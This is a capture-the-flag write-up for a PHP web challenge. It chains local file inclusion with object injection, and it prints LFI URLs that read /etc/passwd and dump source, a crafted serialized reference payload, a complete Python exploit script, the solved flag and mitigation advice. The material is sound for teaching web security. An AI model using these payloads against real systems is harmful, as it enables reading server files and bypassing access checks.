# Online Store - LFI + PHP Object Injection with Reference Exploitation

## Challenge Information
- **Name**: Online Store
- **Category**: Web
- **Difficulty**: Medium
- **Points**: 300
- **URL**: http://138.199.163.92:3000/

## Initial Reconnaissance

When I opened the challenge URL at http://138.199.163.92:3000/, I saw a simple online store page with the title "WELCOME TO MY STORE" and a search box. The page looked pretty basic - just a header, an image, and a form with a text input labeled "Search items" and a submit button.

I opened the browser's DevTools to check the page source. Right away I noticed something interesting in the HTML - there were two hidden paragraphs at the bottom:
- One said "?file=" 
- The other contained what looked like base64: "Rm9sbG93IHRoZSByb290cyE="

I decoded this and got "Follow the roots!" which seemed like a hint.

## Vulnerability Discovery

### Local File Inclusion (LFI)

Looking at the form, I saw it was sending a GET request to index.php with a parameter called "file". This immediately made me think of Local File Inclusion (LFI) vulnerabilities. The parameter name "file" is a classic indicator that the application might be including files based on user input.

I tested the LFI by trying to read /etc/passwd:
```
http://138.199.163.92:3000/index.php?file=/etc/passwd
```

It worked! I got the contents of the passwd file, confirming the LFI vulnerability. But I needed to find the flag, and the hint said "Follow the roots!" which suggested looking in the /root directory. When I tried /root/flag, I got a permission denied error, so I couldn't directly read it.

### Source Code Analysis

Since I had LFI, I decided to read the source code of index.php itself to understand how the application works. I used a PHP filter wrapper to get the base64-encoded source:

```
http://138.199.163.92:3000/index.php?file=php://filter/convert.base64-encode/resource=index.php
```

After decoding the base64, I found the complete PHP source code:

```php
<?php
error_reporting(0);
$FLAG = file_get_contents('/root/flag');

class Admin {
    public $is_admin = 0;
    public $my_secret;
    public $your_secret;
}

if (isset($_COOKIE['winter_is_coming'])) {
    $unout = unserialize(base64_decode($_COOKIE['winter_is_coming']));
    $unout->my_secret = $FLAG;
    
    if ($unout->is_admin == 0 && $unout->your_secret === $unout->my_secret) {
        echo '<div class="congratulations">';
        echo '<h2>🎉 Congratulations! 🎉</h2>';
        echo '<p>You have successfully exploited the vulnerability!</p>';
        echo '<code>' . htmlspecialchars($FLAG) . '</code>';
        echo '</div>';
    }
}

if (isset($_GET['file'])) {
    $file = $_GET['file'];
    include($file);
}
?>
```

## Understanding the Vulnerability

This is where things got interesting. The code had an Admin class and was checking for a cookie called "winter_is_coming". Here's what the vulnerable code was doing:

1. It takes the cookie value, base64 decodes it, and unserializes it
2. After unserializing, it sets `$unout->my_secret = $FLAG`
3. Then it checks: if `$unout->is_admin == 0` AND `$unout->your_secret === $unout->my_secret`, show the flag

The key vulnerability here is **PHP Object Injection** combined with a logic flaw. The code sets `my_secret` to the FLAG after deserialization, then checks if `your_secret` equals `my_secret`. At first this seems impossible - how can `your_secret` equal `my_secret` if we don't know the flag value?

## The Exploitation Technique: PHP Reference Manipulation

The trick is to use PHP's reference feature in serialization. In PHP, you can make one property reference another using the `R:N` syntax in serialized data. If I make `your_secret` a reference to `my_secret`, then when the code sets `my_secret = FLAG`, `your_secret` will automatically also be FLAG because they point to the same memory location.

### Understanding PHP Serialization References

In PHP serialization:
- `R:N` means "Reference to element N"
- When you create a reference, both variables point to the same memory location
- Modifying one automatically modifies the other

### Crafting the Payload

I crafted a serialized Admin object:

```
O:5:"Admin":3:{s:8:"is_admin";i:0;s:9:"my_secret";s:4:"test";s:11:"your_secret";R:3;}
```

Breaking this down:
- `O:5:"Admin":3` - Object of class Admin with 3 properties
- `s:8:"is_admin";i:0` - is_admin = 0 (integer)
- `s:9:"my_secret";s:4:"test"` - my_secret = "test" (will be overwritten with FLAG)
- `s:11:"your_secret";R:3` - your_secret is a Reference to element 3 (which is my_secret's value)

The `R:3` is the magic part. It tells PHP that `your_secret` should reference the same memory location as `my_secret`. So when the code later does `$unout->my_secret = $FLAG`, both `my_secret` and `your_secret` become FLAG.

### Execution Flow

1. Cookie is deserialized: `your_secret` references `my_secret`
2. Code executes: `$unout->my_secret = $FLAG`
3. Because of the reference, `your_secret` also becomes `$FLAG`
4. Condition check: `$unout->your_secret === $unout->my_secret` → TRUE (both are FLAG)
5. Flag is displayed!

## Exploitation

I base64 encoded this payload and set it as the winter_is_coming cookie:

```python
import requests
import base64

payload = 'O:5:"Admin":3:{s:8:"is_admin";i:0;s:9:"my_secret";s:4:"test";s:11:"your_secret";R:3;}'
encoded = base64.b64encode(payload.encode()).decode()

cookies = {'winter_is_coming': encoded}
r = requests.get('http://138.199.163.92:3000/', cookies=cookies)

print(r.text)
```

When I sent this request, the page displayed a congratulations message with the flag in a code block. The condition was satisfied because `your_secret` and `my_secret` were now both pointing to the FLAG value, making them equal.

## Complete Exploit Script

```python
#!/usr/bin/env python3
import requests
import base64
import re

URL = "http://138.199.163.92:3000/"

# Craft the serialized payload with reference
# R:3 makes your_secret reference my_secret's value
payload = 'O:5:"Admin":3:{s:8:"is_admin";i:0;s:9:"my_secret";s:4:"test";s:11:"your_secret";R:3;}'

# Base64 encode the payload
encoded = base64.b64encode(payload.encode()).decode()

# Set the cookie
cookies = {'winter_is_coming': encoded}

# Send the request
r = requests.get(URL, cookies=cookies)

# Extract the flag
flag_match = re.search(r'Kaal\{[^}]+\}', r.text)
if flag_match:
    print(f"FLAG: {flag_match.group(0)}")
else:
    print("Flag not found")
    print(r.text)
```

## Flag
```
Kaal{d33pdA8k5eC83ts}
```

## Vulnerability Breakdown

### 1. Local File Inclusion (LFI)
```php
if (isset($_GET['file'])) {
    $file = $_GET['file'];
    include($file);  // No sanitization!
}
```

**Impact**: Allows reading arbitrary files on the server, including source code.

### 2. PHP Object Injection
```php
$unout = unserialize(base64_decode($_COOKIE['winter_is_coming']));
```

**Impact**: Allows attacker to inject arbitrary objects with controlled properties.

### 3. Logic Flaw with Reference Exploitation
```php
$unout->my_secret = $FLAG;
if ($unout->is_admin == 0 && $unout->your_secret === $unout->my_secret) {
    // Show flag
}
```

**Impact**: By using PHP references, we can make `your_secret` automatically equal `my_secret` after the assignment.

## Mitigation Recommendations

### 1. Fix LFI Vulnerability
```php
// Whitelist allowed files
$allowed_files = ['page1.php', 'page2.php'];
if (isset($_GET['file']) && in_array($_GET['file'], $allowed_files)) {
    include($file);
}

// Or use basename to prevent directory traversal
$file = basename($_GET['file']);
include("pages/" . $file);
```

### 2. Never Unserialize User Input
```php
// Use JSON instead of serialize/unserialize
$data = json_decode(base64_decode($_COOKIE['winter_is_coming']), true);

// Or use signed cookies
$hmac = hash_hmac('sha256', $data, $secret_key);
if (hash_equals($hmac, $_COOKIE['signature'])) {
    // Process data
}
```

### 3. Fix Logic Flaw
```php
// Store the flag separately, don't assign it to user-controlled objects
$admin_secret = $FLAG;

if ($unout->is_admin == 0 && $unout->your_secret === $admin_secret) {
    // Show flag
}

// Or better: don't rely on client-side data for authentication
```

### 4. Implement Proper Access Control
```php
// Use server-side sessions
session_start();
if (isset($_SESSION['is_admin']) && $_SESSION['is_admin'] === true) {
    echo $FLAG;
}
```

## Learning Points

1. **LFI for Source Code Disclosure**: PHP filter wrappers (`php://filter`) can be used to read source code even when direct file inclusion fails

2. **PHP Serialization References**: The `R:N` syntax in PHP serialization creates references that can be exploited to bypass logic checks

3. **Object Injection Dangers**: Never unserialize user-controlled data - it can lead to arbitrary code execution or logic bypasses

4. **Logic Flaws**: Even if you can't directly set a value, references and pointers can create unexpected behavior

5. **Defense in Depth**: Multiple vulnerabilities (LFI + Object Injection + Logic Flaw) combined to achieve the goal

## Technical Deep Dive: PHP References

### How PHP References Work in Serialization

When PHP serializes an object with references:
```php
$obj = new stdClass();
$obj->a = "test";
$obj->b = &$obj->a;  // Reference

echo serialize($obj);
// Output: O:8:"stdClass":2:{s:1:"a";s:4:"test";s:1:"b";R:2;}
```

The `R:2` means "reference to element 2" (which is `$obj->a`).

### Exploitation in Our Case

```php
// Our payload creates this structure:
$admin = new Admin();
$admin->is_admin = 0;
$admin->my_secret = "test";
$admin->your_secret = &$admin->my_secret;  // Reference!

// After unserialization and assignment:
$admin->my_secret = $FLAG;  // This also sets your_secret to FLAG!

// Now the check passes:
$admin->your_secret === $admin->my_secret  // TRUE!
```

## Tags
`web` `php` `lfi` `object-injection` `deserialization` `reference-exploitation` `logic-flaw` `source-code-disclosure`

---

**Team**: Exploit4
**Date**: 2026-03-29
